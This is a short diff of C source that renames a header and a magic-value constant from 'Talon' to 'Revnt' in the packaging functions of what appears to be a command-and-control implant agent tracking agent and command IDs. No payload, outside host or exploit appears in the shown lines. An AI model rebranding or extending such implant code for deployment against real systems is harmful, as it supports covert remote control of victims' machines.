@@ -1,4 +1,4 @@
-#include <Talon.h>
+#include <Revnt.h>
 
 #include <Command.h>
 #include <Package.h>
@@ -111,7 +111,7 @@ PPACKAGE PackageCreate( UINT32 CommandID )
     Package->Encrypt   = TRUE;
 
     PackageAddInt32( Package, 0 );
-    PackageAddInt32( Package, TALON_MAGIC_VALUE );
+    PackageAddInt32( Package, REVNT_MAGIC_VALUE );
     PackageAddInt32( Package, Instance.Session.AgentID );
     PackageAddInt32( Package, CommandID );
 
@@ -129,7 +129,7 @@ PPACKAGE PackageNew(  )
     Package->Encrypt = TRUE;
 
     PackageAddInt32( Package, 0 );
-    PackageAddInt32( Package, TALON_MAGIC_VALUE );
+    PackageAddInt32( Package, REVNT_MAGIC_VALUE );
 
     return Package;
 }
